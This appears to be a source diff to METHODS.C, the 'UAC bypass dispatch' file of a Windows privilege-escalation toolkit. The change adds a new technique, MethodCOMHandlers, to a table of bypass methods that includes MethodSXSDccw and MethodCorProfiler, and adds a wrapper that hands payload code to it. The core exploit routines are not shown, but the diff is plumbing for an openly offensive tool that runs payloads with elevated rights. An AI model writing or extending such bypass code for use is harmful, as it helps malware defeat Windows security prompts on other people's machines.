@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     2.77
+*  VERSION:     2.78
 *
-*  DATE:        21 July 2017
+*  DATE:        30 July 2017
 *
 *  UAC bypass dispatch.
 *
@@ -51,6 +51,7 @@ UCM_API(MethodJunction);
 UCM_API(MethodSXSDccw);
 UCM_API(MethodHakril);
 UCM_API(MethodCorProfiler);
+UCM_API(MethodCOMHandlers);
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodTest, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
@@ -92,7 +93,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodJunction, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodSXSDccw, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodHakril, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodCorProfiler, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { MethodCorProfiler, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodCOMHandlers, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -733,4 +735,12 @@ UCM_API(MethodCorProfiler)
     UNREFERENCED_PARAMETER(ExtraContext);
 
     return ucmMethodCorProfiler(PayloadCode, PayloadSize);
+}
+
+UCM_API(MethodCOMHandlers)
+{
+    UNREFERENCED_PARAMETER(Method);
+    UNREFERENCED_PARAMETER(ExtraContext);
+
+    return ucmMethodCOMHandlers(PayloadCode, PayloadSize);
 }
